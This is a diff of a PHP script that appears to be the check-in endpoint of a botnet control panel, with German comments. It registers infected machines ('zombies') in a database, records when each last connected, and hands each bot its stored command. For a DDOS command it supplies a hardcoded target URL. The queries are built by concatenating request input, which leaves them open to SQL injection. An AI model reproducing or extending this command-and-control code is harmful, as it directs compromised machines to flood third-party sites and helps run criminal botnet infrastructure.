@@ -2,25 +2,31 @@
 include_once('config.php');
 
 $zombieID = isset($_GET['id'])?$_GET['id']:'';
-$zombieIP = isset($_GET['ip'])?$_GET['ip']:'';
-if(!empty($zombieID)&&getenv("REMOTE_ADDR")) {
+if(!empty($zombieID)) {
 	
 	include_once('setup_db_conn.php');
 	
+	
+	
 	// Bot bereits registriert?
-	$query = 'SELECT id FROM zombies WHERE id='.htmlentities($zombieID).';';
-	$result = mysql_query($query);
-	if(mysql_num_rows($result)>0) {
+	$query = 'SELECT * FROM zombies WHERE id="'.htmlentities($zombieID).'";';
+	$result = mysqli_query($link,$query);
+	if($result && mysqli_num_rows($result)>0) {
+		$row = mysqli_fetch_assoc($result);
+		echo $row["command"];
+		if($row["command"] == "DDOS") {
+			echo " http://www.yolocaust.de/tentob/ 3 1";
+		}
+		mysqli_free_result($result);
 		// Bot bekannt
-		$query = 'UPDATE zombies SET ip="'.getenv("REMOTE_ADDR").'" WHERE id='.htmlentities($zombieID).';';
+		$query = 'UPDATE zombies SET last_connect=NOW() WHERE id="'.htmlentities($zombieID).'";';
 	} else {
 		// neuer Bot
-		$query = 'INSERT INTO zombies (id,ip) VALUES ('.htmlentities($zombieID).',"'.getenv("REMOTE_ADDR").'");';
+		$query = 'INSERT INTO zombies (id) VALUES ("'.htmlentities($zombieID).'");';
+		echo "New Zombie inserted: ".$query;
 	}
-	mysql_query($query);
-	
-	mysql_free_result($result);
-	mysql_close($link);
+	mysqli_query($link,$query);	
+	mysqli_close($link);
 	
 	//echo getenv("HTTP_X_FORWARDED_FOR")?getenv("HTTP_X_FORWARDED_FOR").'<br>':'';
 	//echo getenv("REMOTE_ADDR");
